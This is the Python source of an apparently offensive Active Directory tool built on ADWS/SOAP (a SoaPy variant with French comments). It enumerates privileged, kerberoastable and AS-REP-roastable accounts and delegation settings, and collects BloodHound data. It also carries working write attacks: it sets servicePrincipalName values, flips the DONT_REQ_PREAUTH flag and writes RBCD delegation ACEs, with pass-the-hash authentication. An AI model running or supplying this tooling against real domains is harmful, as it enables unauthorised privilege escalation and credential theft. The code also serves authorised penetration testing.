import argparse
import logging
import sys
import json
# import io # Pas directement utilisé ici, peut être retiré si non nécessaire ailleurs
import unicodedata
from base64 import b64decode, b64encode 
from uuid import UUID

from .cache_gen import (
    generate_soaphound_caches, 
    combine_generated_caches,
    process_bloodhound_data # Importé pour l'option --bloodhound
)

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)
from src.adws import ADWSConnect, NTLMAuth 
from src.soap_templates import NAMESPACES

# --- Fonctions Utilitaires et d'Écriture (Identiques à script2) ---
def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR(); sd["Revision"] = b"\x01"; sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772; sd["OwnerSid"] = LDAP_SID(); sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""; sd["Sacl"] = b""; acl = ACL(); acl["AclRevision"] = 4
    acl["Sbz1"] = 0; acl["Sbz2"] = 0; acl.aces = []; sd["Dacl"] = acl; return sd

def _create_allow_ace(sid: LDAP_SID):
    nace = ACE(); nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE; nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE(); acedata["Mask"] = ACCESS_MASK(); acedata["Mask"]["Mask"] = 983551
    acedata["Sid"] = sid.getData(); nace["Ace"] = acedata; return nace

def getAccountDN(target: str, username: str, ip: str, domain: str, auth: NTLMAuth):
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    attributes: list = ["distinguishedname"]
    try: pull_et = pull_client.pull(query=get_account_query, attributes=attributes)
    except Exception as e: logging.critical(f"Failed to pull DN for {target}: {e}"); sys.exit(1)
    dn = None
    for item_xml in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
        dn_node = item_xml.find("./addata:distinguishedName", namespaces=NAMESPACES)
        if dn_node is not None:
            dn_val_node = dn_node.find("./ad:value", namespaces=NAMESPACES)
            if dn_val_node is not None and dn_val_node.text is not None: dn = dn_val_node.text; break 
    if dn is None: logging.critical(f"Unable to find distinguishedName for target: {target}"); sys.exit(1)
    return dn

def set_spn(target: str, value: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False):
    # Note: les arguments ip, domain, target, value, username, auth, remove
    # l'appel dans run_cli doit correspondre à cet ordre ou utiliser des noms d'arguments.
    dn = getAccountDN(target, username, ip, domain, auth) # Assurer l'ordre correct
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    try:
        put_client.put(object_ref=dn, operation="add" if not remove else "delete", attribute="addata:servicePrincipalName", data_type="string", value=value)
        print(f"[+] servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!")
    except Exception as e: logging.error(f"Failed to set SPN for {target}: {e}")

def set_asrep(target: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False):
    dn = getAccountDN(target, username, ip, domain, auth)
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    attributes: list = ["userAccountControl"]
    try: pull_et = pull_client.pull(query=f"(distinguishedName={dn})", attributes=attributes)
    except Exception as e: logging.critical(f"Failed to pull UAC for {target}: {e}"); sys.exit(1)
    uac_val_text = None
    for item_xml in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
        uac_node = item_xml.find("./addata:userAccountControl", namespaces=NAMESPACES)
        if uac_node is not None:
            uac_val_node = uac_node.find("./ad:value", namespaces=NAMESPACES)
            if uac_val_node is not None and uac_val_node.text is not None: uac_val_text = uac_val_node.text; break
    if uac_val_text is None: logging.critical(f"Unable to find UAC for {target}"); sys.exit(1)
    try: uac_val = int(uac_val_text)
    except ValueError: logging.critical(f"Invalid UAC value for {target}: {uac_val_text}"); sys.exit(1)
    newUac = uac_val | 0x400000 if not remove else uac_val & ~0x400000
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    try:
        put_client.put(object_ref=dn, operation="replace", attribute="addata:userAccountControl", data_type="string", value=str(newUac))
        print(f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} for {target}!")
    except Exception as e: logging.error(f"Failed to set ASREP for {target}: {e}")

def set_rbcd(target: str, account: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False,):
    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    attributes: list = ["samaccountname", "objectsid", "distinguishedname", "msds-allowedtoactonbehalfofotheridentity"]
    try: pull_et = pull_client.pull(query=get_accounts_queries, attributes=attributes)
    except Exception as e: logging.critical(f"Failed to pull data for RBCD on {target}/{account}: {e}"); sys.exit(1)
    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn_val: str = ""
    account_sid_obj: LDAP_SID | None = None
    for item_xml in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
        sam_name_text, sid_b64_text, sd_b64_text, dn_text = "", "", "", ""
        sam_node = item_xml.find("./addata:samaccountname", namespaces=NAMESPACES); sam_val_node = sam_node.find("./ad:value", namespaces=NAMESPACES) if sam_node else None
        if sam_val_node is not None: sam_name_text = sam_val_node.text or ""
        sid_node = item_xml.find("./addata:objectsid", namespaces=NAMESPACES); sid_val_node = sid_node.find("./ad:value", namespaces=NAMESPACES) if sid_node else None
        if sid_val_node is not None: sid_b64_text = sid_val_node.text or ""
        sd_node = item_xml.find("./addata:msds-allowedtoactonbehalfofotheridentity", namespaces=NAMESPACES); sd_val_node = sd_node.find("./ad:value", namespaces=NAMESPACES) if sd_node else None
        if sd_val_node is not None: sd_b64_text = sd_val_node.text or ""
        dn_node = item_xml.find("./addata:distinguishedname", namespaces=NAMESPACES); dn_val_node = dn_node.find("./ad:value", namespaces=NAMESPACES) if dn_node else None
        if dn_val_node is not None: dn_text = dn_val_node.text or ""

        if sam_name_text and sid_b64_text and sam_name_text.casefold() == account.casefold():
            try: account_sid_obj = LDAP_SID(data=b64decode(sid_b64_text))
            except Exception as e: logging.warning(f"Error decoding SID for attacker {account}: {e}")
        if dn_text and sam_name_text and sam_name_text.casefold() == target.casefold():
            target_dn_val = dn_text
            if sd_b64_text:
                try: target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd_b64_text))
                except Exception as e: logging.warning(f"Error decoding SD for target {target}: {e}"); target_sd = _create_empty_sd()
    if not account_sid_obj: logging.critical(f"Unable to find/decode SID for attacker {account}"); sys.exit(1)
    if not target_dn_val: logging.critical(f"Unable to find DN for target {target}"); sys.exit(1)
    target_sd["Dacl"].aces = [ace for ace in target_sd["Dacl"].aces if ace["Ace"]["Sid"].formatCanonical() != account_sid_obj.formatCanonical()]
    if not remove: target_sd["Dacl"].aces.append(_create_allow_ace(account_sid_obj))
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    encoded_sd = b64encode(target_sd.getData()).decode("utf-8")
    try:
        put_client.put(object_ref=target_dn_val, operation="replace", attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity", data_type="base64Binary", value=encoded_sd)
        if remove and len(target_sd["Dacl"].aces) == 0:
            put_client.put(object_ref=target_dn_val, operation="delete", attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity", data_type="base64Binary", value=encoded_sd)
        print(f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} on {target}!")
        print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")
    except Exception as e: logging.error(f"Failed to set RBCD for {target}: {e}")

def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝
███████║╚██████╔╝██║  ██║██║        ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ██║1.1
    """)

    parser = argparse.ArgumentParser(add_help=True, description="Enumerate/write LDAP via ADWS/SOAP")
    parser.add_argument("connection", action="store", help="domain/username[:password]@<targetName or address>")
    parser.add_argument("--debug", action="store_true", help="Turn DEBUG output ON")
    parser.add_argument("--ts", action="store_true", help="Adds timestamp to every logging output.")
    parser.add_argument("--hash", action="store", metavar="nthash", help="Use an NT hash for authentication")

    enum = parser.add_argument_group('Enumeration')
    enum.add_argument("--users", action="store_true", help="Enumerate user objects")
    enum.add_argument("--computers", action="store_true", help="Enumerate computer objects")
    enum.add_argument("--cache", action="store_true", help="Create SOAPHound cache files (output: cache_soapy.json)")
    enum.add_argument("--bloodhound", action="store_true", help="Collect AD objects and generate BloodHound JSON files")
    enum.add_argument("--nolaps", action="store_true", help="Exclude LAPS attribute (ms-MCS-AdmPwdExpirationTime) when using --bloodhound")
    enum.add_argument("--groups", action="store_true", help="Enumerate group objects")
    enum.add_argument("--constrained", action="store_true", help="Enumerate objects with msDS-AllowedToDelegateTo")
    enum.add_argument("--unconstrained", action="store_true", help="Enumerate objects with TRUSTED_FOR_DELEGATION")
    enum.add_argument("--spns", action="store_true", help="Enumerate accounts with servicePrincipalName")
    enum.add_argument("--asreproastable", action="store_true", help="Enumerate accounts with DONT_REQ_PREAUTH")
    enum.add_argument("--admins", action="store_true", help="Enumerate high privilege accounts")
    enum.add_argument("--rbcds", action="store_true", help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity")
    enum.add_argument("-q", "--query", action="store", metavar="query", help="Raw LDAP query to execute")
    enum.add_argument("--filter", action="store", metavar="attr,...", help="Attributes to select (comma-separated)")

    writing = parser.add_argument_group('Writing')
    writing.add_argument("--rbcd", action="store", metavar="source", help="Write/remove RBCD")
    writing.add_argument("--spn", action="store", metavar="value", help="Write servicePrincipalName")
    writing.add_argument("--asrep", action="store_true", help="Write DONT_REQ_PREAUTH flag")
    writing.add_argument("--account", action="store", metavar="account", help="Target account for write operations")
    writing.add_argument("--remove", action="store_true", help="Remove attribute value (for SPN, RBCD, ASREP)")

    if len(sys.argv) == 1: parser.print_help(); sys.exit(1)
    options = parser.parse_args()

    if options.nolaps and not options.bloodhound:
        parser.error("--nolaps ne peut être utilisé qu'avec l'option --bloodhound.")
    
    logger.init(options.ts)
    logging.getLogger().setLevel(logging.DEBUG if options.debug else logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)
    if domain is None: domain = ""
    if not password and username and not options.hash:
        from getpass import getpass
        password = getpass("Password:")
    auth = NTLMAuth(password=password, hashes=options.hash)

    if options.rbcd or options.spn or options.asrep:
        if not (domain and username and remoteName): logging.critical("Connection details required for write ops."); sys.exit(1)
        if options.rbcd:
            if not options.account: logging.critical("--rbcd requires --account"); sys.exit(1)
            set_rbcd(options.account, options.rbcd, username, remoteName, domain, auth, options.remove)
        elif options.spn:
            if not options.account: logging.critical("--spn requires --account"); sys.exit(1)
            set_spn(options.account, options.spn, username, remoteName, domain, auth, options.remove)
        elif options.asrep:
            if not options.account: logging.critical("--asrep requires --account"); sys.exit(1)
            set_asrep(options.account, username, remoteName, domain, auth, options.remove)
        sys.exit(0)

    # Si on arrive ici, c'est pour une énumération, cache, ou bloodhound
    if not (domain and username and remoteName):
        logging.critical("Connection details (domain, username, target) are required for enumeration/collection.")
        sys.exit(1)
        
    client = ADWSConnect.pull_client(ip=remoteName, domain=domain, username=username, auth=auth)
    domain_root_dn = f"DC={domain.replace('.', ',DC=')}"
    
    all_pulled_items = []
    query_to_execute = "(objectClass=*)" # Requête large pour BH et Cache
    attributes_to_fetch = []
    action_performed = False

    if options.bloodhound:
        action_performed = True
        logging.info("Preparing for BloodHound data collection...")
        attributes_to_fetch = [
            "name", "sAMAccountName", "cn", "dNSHostName", "objectSid", "objectGUID",
            "primaryGroupID", "distinguishedName", "lastLogonTimestamp", "pwdLastSet",
            "servicePrincipalName", "description", "operatingSystem", "sIDHistory",
            "nTSecurityDescriptor", "userAccountControl", "whenCreated", "lastLogon",
            "displayName", "title", "homeDirectory", "userPassword", "unixUserPassword",
            "scriptPath", "adminCount", "member", "memberOf", "msDS-Behavior-Version",
            "msDS-AllowedToDelegateTo", "ms-MCS-AdmPwdExpirationTime", "gPCFileSysPath", "gPLink", "gPOptions",
            "objectClass", "msDS-AllowedToActOnBehalfOfOtherIdentity"
        ]
        if options.nolaps:
            logging.info("Excluding LAPS attribute (ms-MCS-AdmPwdExpirationTime) due to --nolaps.")
            if "ms-MCS-AdmPwdExpirationTime" in attributes_to_fetch:
                 attributes_to_fetch.remove("ms-MCS-AdmPwdExpirationTime")
    
    elif options.cache:
        action_performed = True
        logging.info("Preparing for Cache data collection...")
        attributes_to_fetch = ["objectSid", "objectGUID", "distinguishedName", "objectClass"]
    
    elif options.query:
        action_performed = True
        query_to_execute = options.query
        attributes_to_fetch = [attr.strip() for attr in options.filter.split(',')] if options.filter else \
                              ["sAMAccountName", "distinguishedName", "objectSid", "objectClass"]
        logging.info(f"Custom query: {query_to_execute} with attributes: {attributes_to_fetch}")
    
    else: # Énumération standard
        enum_flags_map = {
            "users": "(&(objectClass=user)(objectCategory=person))", "computers": "(objectClass=computer)",
            "groups": "(objectCategory=group)", "constrained": "(msds-allowedtodelegateto=*)",
            "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
            "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
            "asreproastable": "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
            "admins": "(&(objectClass=user)(adminCount=1))", "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)"
        }
        for flag, query_str in enum_flags_map.items():
            if getattr(options, flag, False):
                action_performed = True
                query_to_execute = query_str
                logging.info(f"Enumerating {flag} with query: {query_to_execute}")
                attributes_to_fetch = [attr.strip() for attr in options.filter.split(',')] if options.filter else \
                                      ["sAMAccountName", "distinguishedName"]
                break
        if not action_performed: # Si aucun flag d'énumération n'a été activé
            logging.info("No specific collection/enumeration task. Use --help for options.")
            sys.exit(0)

    if query_to_execute and attributes_to_fetch:
        logging.info(f"Executing ADWS pull: Query='{query_to_execute}', Attributes='{attributes_to_fetch}'")
        try:
            pull_et = client.pull(query_to_execute, attributes_to_fetch)
            for items_node in pull_et.findall(".//wsen:Items", namespaces=NAMESPACES):
                for item_xml in items_node.findall("./*", namespaces=NAMESPACES):
                    obj_data = {attr_key_init: None for attr_key_init in attributes_to_fetch} # Initialise

                    for attr_name in attributes_to_fetch:
                        attr_values_list = []
                        attribute_node = item_xml.find(f"./addata:{attr_name}", namespaces=NAMESPACES)
                        if attribute_node is not None:
                            for val_elem in attribute_node.findall("./ad:value", namespaces=NAMESPACES):
                                if val_elem.text is not None:
                                    attr_values_list.append(val_elem.text) # Garder la chaîne brute (Base64 pour binaires)
                        if attr_values_list:
                            obj_data[attr_name] = attr_values_list[0] if len(attr_values_list) == 1 else attr_values_list
                    
                    # Assurer la présence de DN et objectClass si demandés ou par défaut
                    current_dn = obj_data.get('distinguishedName')
                    if not current_dn: # Tenter de le récupérer s'il manque après la boucle
                        dn_node = item_xml.find("./addata:distinguishedName", namespaces=NAMESPACES)
                        if dn_node is not None:
                            dn_val_node = dn_node.find("./ad:value", namespaces=NAMESPACES)
                            if dn_val_node is not None and dn_val_node.text is not None:
                                obj_data['distinguishedName'] = dn_val_node.text
                                current_dn = dn_val_node.text
                    
                    current_oc = obj_data.get('objectClass')
                    if not current_oc:
                        oc_parent_node = item_xml.find("./addata:objectClass", namespaces=NAMESPACES)
                        if oc_parent_node is not None:
                            obj_data['objectClass'] = [oc.text for oc in oc_parent_node.findall("./ad:value", namespaces=NAMESPACES) if oc.text]
                        else: obj_data['objectClass'] = []


                    # Logging spécifique pour l'objet domaine pour le débogage du cache
                    if options.cache and current_dn and current_dn.lower() == domain_root_dn.lower():
                        logging.info(f"Script3 (Cache Collect): Data for DOMAIN OBJECT '{current_dn}': "
                                     f"objectSid='{obj_data.get('objectSid')}', objectGUID='{obj_data.get('objectGUID')}', "
                                     f"objectClass='{obj_data.get('objectClass')}'")

                    if current_dn: # Un objet doit avoir un DN pour être utile
                        all_pulled_items.append(obj_data)
            logging.info(f"Collected {len(all_pulled_items)} objects from ADWS.")
        except Exception as e:
            logging.critical(f"Error during ADWS data collection: {e}", exc_info=True); sys.exit(1)
    
    if options.bloodhound:
        if all_pulled_items: process_bloodhound_data(all_pulled_items, domain, domain_root_dn)
        else: logging.warning("No data collected for BloodHound processing.")
    
    elif options.cache:
        if all_pulled_items:
            id_to_type, value_to_id = generate_soaphound_caches(all_pulled_items, domain_root_dn, output_dir=".")
            if id_to_type is not None and value_to_id is not None: # Vérifier la non-nullité
                combine_generated_caches(id_to_type, value_to_id, output_path="cache_soapy.json")
                logging.info("SOAPHound cache file 'cache_soapy.json' generated.")
            else: logging.error("Cache generation failed, cache_soapy.json not created because individual caches are empty/failed.")
        else: logging.warning("No data collected for cache generation.")
            
    elif not (options.bloodhound or options.cache or options.rbcd or options.spn or options.asrep):
        if all_pulled_items:
            logging.info(f"--- Enumeration Results ({len(all_pulled_items)} objects) ---")
            for i, obj in enumerate(all_pulled_items):
                print(f"\nObject {i+1}: DN: {obj.get('distinguishedName', 'N/A')}")
                for k, v_raw in obj.items():
                    if k == 'distinguishedName': continue
                    v_str_list = []
                    # Assurer que v_raw est une liste pour itérer, ou le transformer en liste
                    v_list = v_raw if isinstance(v_raw, list) else ([v_raw] if v_raw is not None else [])
                    for v_item in v_list:
                        if isinstance(v_item, bytes): # Devrait être rare ici, car on stocke B64 en str
                            v_str_list.append(f"<binary data, {len(v_item)} bytes>")
                        else:
                            v_str_list.append(str(v_item))
                    if v_str_list: print(f"  {k}: {', '.join(v_str_list)}")
        else: logging.info("No objects found for the specified enumeration query.")

if __name__ == "__main__":
    run_cli()